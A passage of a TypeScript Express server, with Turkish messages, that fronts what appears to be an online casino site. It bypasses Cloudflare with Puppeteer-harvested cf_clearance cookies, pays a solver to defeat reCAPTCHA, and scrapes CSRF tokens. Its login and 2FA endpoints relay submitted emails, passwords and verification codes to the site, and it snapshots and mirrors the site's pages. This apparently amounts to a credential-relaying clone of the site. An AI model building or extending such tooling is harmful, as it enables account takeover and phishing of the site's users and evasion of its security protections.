          cfBm: cfCookies.cfBm ? "present" : "missing",
          cfClearance: cfCookies.cfClearance ? "present" : "missing",
        });
      } else {
        res.json({ success: false, error: "Failed to get cookies" });
      }
    } catch (error: any) {
      res.json({ success: false, error: error.message });
    }
  });

  app.post("/api/puppeteer-login", async (req, res) => {
    try {
      const { email, password } = req.body;
      if (!email || !password) return res.json({ success: false, error: "Email and password required" });

      log("API-LOGIN", `Login for: ${email}`);

      // Step 1: Fetch login page via proxy to get CSRF token
      // Ensure CF cookies are ready
      if (!isCfReady()) {
        log("API-LOGIN", "CF not ready, waiting...");
        await waitForCfReady(15000);
      }

      log("API-LOGIN", "Step 1: Fetching CSRF token...");
      let loginPageHtml = "";
      for (let attempt = 1; attempt <= 3; attempt++) {
        loginPageHtml = await fetchViaProxy("/tr/Login/Login", "GET");
        log("API-LOGIN", `Attempt ${attempt}: ${loginPageHtml.length} bytes`);
        if (loginPageHtml.length > 500 && loginPageHtml.includes("RequestVerificationToken")) break;
        if (attempt < 3) await new Promise(r => setTimeout(r, 2000));
      }

      const csrfMatch = loginPageHtml.match(/name="__RequestVerificationToken"[^>]*value="([^"]+)"/);
      const csrfToken = csrfMatch ? csrfMatch[1] : "";
      log("API-LOGIN", `CSRF: ${csrfToken ? "OK" : "NOT FOUND"}`);

      if (!csrfToken) {
        log("API-LOGIN", `Page preview: ${loginPageHtml.substring(0, 300)}`);
        const hasCfClearance = storedCookies.has("cf_clearance");
        return res.json({ 
          success: false, 
          error: hasCfClearance 
            ? "Login sayfasına ulaşılamadı. Proxy bağlantısını kontrol edin."
            : "Cloudflare koruması geçilemedi. Aşağıdaki 'Manuel Cookie Aktarımı' bölümünden cf_clearance cookie'sini ekleyin.",
          needsCookieImport: !hasCfClearance
        });
      }

      const siteKeyMatch = loginPageHtml.match(/render=([A-Za-z0-9_-]{30,})/);
      const siteKey = siteKeyMatch ? siteKeyMatch[1] : "";

      // Step 2: Solve reCAPTCHA (only if cf_clearance is available - otherwise it's wasted money)
      let recaptchaToken = "";
      const hasCfForApi = storedCookies.has("cf_clearance");
      if (siteKey && hasCfForApi) {
        log("API-LOGIN", "Step 2: Solving reCAPTCHA (cf_clearance available)...");
        if (isCaptchaConfigured()) {
          try {
            const captchaResult = await solveRecaptchaV3(`${getTargetOrigin()}/tr/Login/Login`, siteKey, "login");
            if (captchaResult.success && captchaResult.token) {
              recaptchaToken = captchaResult.token;
              log("API-LOGIN", "reCAPTCHA solved!");
            } else {
              log("API-LOGIN", `reCAPTCHA failed: ${captchaResult.error}`);
            }
          } catch (e: any) {
            log("API-LOGIN", `Captcha error: ${e.message}`);
          }
        } else {
          log("API-LOGIN", "CAPTCHA_API_KEY not set, skipping reCAPTCHA");
        }
      } else if (!hasCfForApi) {
        log("API-LOGIN", "Step 2: Skipping reCAPTCHA - cf_clearance not available");
      }

      // Step 3: Submit login
      log("API-LOGIN", "Step 3: Submitting login...");
      const formData = new URLSearchParams();
      formData.append("Email", email);
      formData.append("Password", password);
      if (csrfToken) formData.append("__RequestVerificationToken", csrfToken);
      if (recaptchaToken) formData.append("g-recaptcha-response", recaptchaToken);
      formData.append("FormToken", getTargetHost());
      formData.append("gameUrl", "");

      const loginResult = await postViaProxy("/login/login", formData.toString());
      log("API-LOGIN", `Status: ${loginResult.statusCode}, Body: ${loginResult.body.substring(0, 300)}`);

      // Step 4: Parse result
      try {
        const json = JSON.parse(loginResult.body);
        log("API-LOGIN", `JSON: ${JSON.stringify(json)}`);

        const isSuccess = json.Success === true || json.IsSuccess === true;
        const is2FA = json.RedirectUrl?.includes("erification") ||
                      json.Message?.includes("kod") || json.Message?.includes("2FA") ||
                      json.Message?.includes("dogrulama") || json.Message?.includes("Doğrulama");

        if (isSuccess && is2FA) {
          return res.json({ success: false, error: "2FA_REQUIRED", message: "2FA_REQUIRED", requires2FA: true, cookiesCount: storedCookies.size });
        }
        if (isSuccess) {
          return res.json({ success: true, message: json.Message || "Giriş başarılı!", cookiesCount: storedCookies.size, hasCfClearance: storedCookies.has("cf_clearance") });
        }

        return res.json({ success: false, error: json.Message || "Giriş başarısız", message: json.Message });
      } catch {
        if (loginResult.statusCode === 302 || loginResult.statusCode === 301) {
          return res.json({ success: true, message: "Giriş başarılı! (redirect)", cookiesCount: storedCookies.size });
        }
        if (loginResult.statusCode === 403) {
          return res.json({ success: false, error: "Cloudflare koruma aktif (403). Admin panelinden Manuel Cookie Aktarımı yaparak cf_clearance cookie'sini ekleyin." });
        }
        return res.json({ success: false, error: `Sunucu hatası (${loginResult.statusCode})` });
      }
    } catch (error: any) {
      log("API-LOGIN", `Error: ${error.message}`);
      res.json({ success: false, error: error.message });
    }
  });

  app.post("/api/verify-2fa", async (req, res) => {
    try {
      const { email, password, code } = req.body;
      if (!email || !password || !code) return res.json({ success: false, error: "Email, şifre ve kod gerekli" });

      log("API-2FA", `Verifying 2FA for: ${email}`);

      // Step 1: Get verification page CSRF token
      const verifyPageHtml = await fetchViaProxy("/tr/Login/EmailVerification", "GET");
      const csrfMatch = verifyPageHtml.match(/name="__RequestVerificationToken"[^>]*value="([^"]+)"/);
      const csrfToken = csrfMatch ? csrfMatch[1] : "";

      if (!csrfToken) {
        log("API-2FA", "CSRF token not found on verification page");
        return res.json({ success: false, error: "Doğrulama sayfasına ulaşılamadı" });
      }

      // Step 2: Solve reCAPTCHA if needed
      const siteKeyMatch = verifyPageHtml.match(/render=([A-Za-z0-9_-]{30,})/);
      const siteKey = siteKeyMatch ? siteKeyMatch[1] : "";
      let recaptchaToken = "";
      if (siteKey && isCaptchaConfigured()) {
        try {
          const captchaResult = await solveRecaptchaV3(`${getTargetOrigin()}/tr/Login/EmailVerification`, siteKey, "verify");
          if (captchaResult.success && captchaResult.token) recaptchaToken = captchaResult.token;
        } catch (e: any) {
          log("API-2FA", `Captcha error: ${e.message}`);
        }
      }

      // Step 3: Submit verification
      const formData = new URLSearchParams();
      formData.append("Code", code);
      formData.append("Email", email);
      if (csrfToken) formData.append("__RequestVerificationToken", csrfToken);
      if (recaptchaToken) formData.append("g-recaptcha-response", recaptchaToken);

      const result = await postViaProxy("/login/emailverification", formData.toString());
      log("API-2FA", `Status: ${result.statusCode}, Body: ${result.body.substring(0, 300)}`);

      try {
        const json = JSON.parse(result.body);
        if (json.Success === true || json.IsSuccess === true) {
          return res.json({ success: true, message: "Doğrulama başarılı!", cookiesCount: storedCookies.size });
        }
        return res.json({ success: false, error: json.Message || "Doğrulama başarısız" });
      } catch {
        if (result.statusCode === 302 || result.statusCode === 301) {
          return res.json({ success: true, message: "Doğrulama başarılı! (redirect)", cookiesCount: storedCookies.size });
        }
        return res.json({ success: false, error: `Doğrulama hatası (${result.statusCode})` });
      }
    } catch (error: any) {
      log("API-2FA", `Error: ${error.message}`);
      res.json({ success: false, error: error.message });
    }
  });

  // ═══════════════════════════════════════════════════
  // ─── Snapshot API ───
  // ═══════════════════════════════════════════════════

  app.post("/api/snapshot/create", async (req: Request, res: Response) => {
    try {
      const progress = getSnapshotProgress();
      if (progress.status === "running") {
        return res.status(409).json({ error: "Snapshot zaten devam ediyor", progress });
      }

      const pagePaths = req.body?.pages || [
        "/tr/",
        "/tr/lobby/casino/main/all/pragmaticplay",
        "/tr/lobby/casino/main/all/egtdigital",
        "/tr/lobby/casino/main/all/amusnet",
        "/sections/targeted-promotion/hosgeldin-yatirim-bonusu",
      ];
      const deviceType = req.body?.deviceType || "mobile";

      res.json({ message: "Snapshot başlatıldı", status: "running" });

      (async () => {
        try {
          log("SNAPSHOT-API", "Taze Cloudflare cookie'leri alınıyor...");
          const cfResult = await getCloudflareBypassCookies();
          if (cfResult && cfResult.allCookies) {
            for (const [k, v] of Object.entries(cfResult.allCookies)) {
              storedCookies.set(k, v);
            }
            log("SNAPSHOT-API", `CF bypass başarılı, ${Object.keys(cfResult.allCookies).length} cookie güncellendi`);
          } else {
            log("SNAPSHOT-API", "CF bypass cookie alınamadı, mevcut cookie'lerle devam ediliyor");
          }
        } catch (e: any) {
          log("SNAPSHOT-API", `CF bypass hatası: ${e.message}, mevcut cookie'lerle devam ediliyor`);
        }

        createSnapshot(
          getTargetUrl(),
          getTargetHost(),
          storedCookies,
          USER_AGENT,
          proxyAgent,
          pagePaths,
          deviceType
        ).catch((err) => {
          log("SNAPSHOT-API", `Snapshot error: ${err.message}`);
        });
      })();
    } catch (error: any) {
      res.status(500).json({ error: error.message });
    }
  });

  app.get("/api/snapshot/progress", (_req: Request, res: Response) => {
    res.json(getSnapshotProgress());
  });

  app.get("/api/snapshots", (_req: Request, res: Response) => {
    const snapshots = listSnapshots();
    res.json({
      snapshots,
      activeId: getActiveSnapshotId(),
    });
  });

  app.post("/api/snapshot/:id/activate", (req: Request, res: Response) => {
    const success = activateSnapshot(String(req.params.id));
    if (!success) return res.status(404).json({ error: "Snapshot bulunamadı" });
    res.json({ message: "Snapshot aktif edildi", id: req.params.id });
  });

  app.post("/api/snapshot/deactivate", (_req: Request, res: Response) => {
    deactivateSnapshot();
    res.json({ message: "Snapshot devre dışı bırakıldı, proxy modu aktif" });
  });

  app.delete("/api/snapshot/:id", (req: Request, res: Response) => {
    const success = deleteSnapshot(String(req.params.id));
    if (!success) return res.status(404).json({ error: "Snapshot bulunamadı" });
    res.json({ message: "Snapshot silindi" });
  });

  app.get("/api/snapshot/mode", (_req: Request, res: Response) => {
    const activeId = getActiveSnapshotId();
    res.json({
      mode: activeId ? "snapshot" : "proxy",
      activeSnapshotId: activeId,
      snapshotUrl: activeId ? "/snapshot/tr/" : null,
      proxyUrl: "/tr/",
    });
  });

  app.post("/api/clear-cookies", (_req, res) => {
    storedCookies.clear();
    res.json({ message: "Cookies cleared", count: 0 });
  });

  app.post("/api/clear-cache", (_req, res) => {
    const size = responseCache.size;
    responseCache.clear(); clearDiskCache();
    res.setHeader("Cache-Control", "no-store, no-cache");
    res.json({ message: "Cache temizlendi", cleared: size });
  });
  app.get("/api/clear-cache", (_req, res) => {
    const size = responseCache.size;
    responseCache.clear(); clearDiskCache();
    res.setHeader("Cache-Control", "no-store, no-cache");
    res.json({ message: "Proxy cache temizlendi", cleared: size });
  });

  app.get("/api/cache-status", (_req, res) => {
    let totalSize = 0;
    responseCache.forEach((entry) => {
      totalSize += typeof entry.body === 'string' ? Buffer.byteLength(entry.body) : entry.body.length;
    });
    res.json({
      entries: responseCache.size,
      maxEntries: MAX_CACHE_SIZE,
      totalSize: formatSize(totalSize),
      htmlCacheTTL: HTML_CACHE_TTL / 1000 + 's',
      assetCacheTTL: ASSET_CACHE_TTL / 1000 + 's',
    });
  });

  app.get("/api/cookies", (_req, res) => {
    res.json({
      count: storedCookies.size,
      names: Array.from(storedCookies.keys()),
      hasCfClearance: storedCookies.has("cf_clearance"),
      hasSessionId: storedCookies.has("ASP.NET_SessionId"),
    });
  });

  // ═══════════════════════════════════════════════════
  // ─── Startup Warmup ───
  // ═══════════════════════════════════════════════════
  if (isProxyConfigured()) {
    (async () => {
      try {
        // CRITICAL: Sync session IDs so Puppeteer and proxy use same IP
        setPuppeteerSessionId(currentSessionId);
        log("INIT", `Session synced: ${currentSessionId}`);

        await testProxyConnection();
        log("INIT", `Session ${currentSessionId}, ${storedCookies.size} cookies`);

        log("INIT", "Starting Puppeteer CF bypass...");
        const cfCookies = await getCloudflareBypassCookies();
        if (cfCookies) {
          // Sync session in case Puppeteer changed it during retries
          const newSid = getPuppeteerSessionId();
          if (newSid !== currentSessionId) {
            currentSessionId = newSid;
            proxyAgent = createProxyAgent();
            log("INIT", `Session updated to match Puppeteer: ${currentSessionId}`);
          }
          for (const [k, v] of Object.entries(cfCookies.allCookies)) storedCookies.set(k, v);
          log("INIT", `CF bypass done, ${storedCookies.size} cookies total`);
        } else {
          log("INIT", "CF bypass failed, falling back");
          await warmupEndpoint("/login/login");
        }

        const quickWarmup = ["/tr/", "/tr/Casino", "/tr/LiveCasino", "/tr/Sports"];
        for (const p of quickWarmup) {
          await warmupEndpoint(p);
        }
        log("INIT", `Warmup done, ${storedCookies.size} cookies`);
        setImmediate(() => { runFullWarmup().then(() => {}).catch(() => {}); });
        setInterval(() => { runFullWarmup().then(() => {}).catch(() => {}); }, 30 * 60 * 1000);
      } catch (err) {
        console.error("Init warmup failed:", err);
      }
    })();
  } else {
    log("INIT", "Proxy not configured - skipping warmup. Set PROXY_USER and PROXY_PASS to enable proxy features.");
  }

  return httpServer;
}
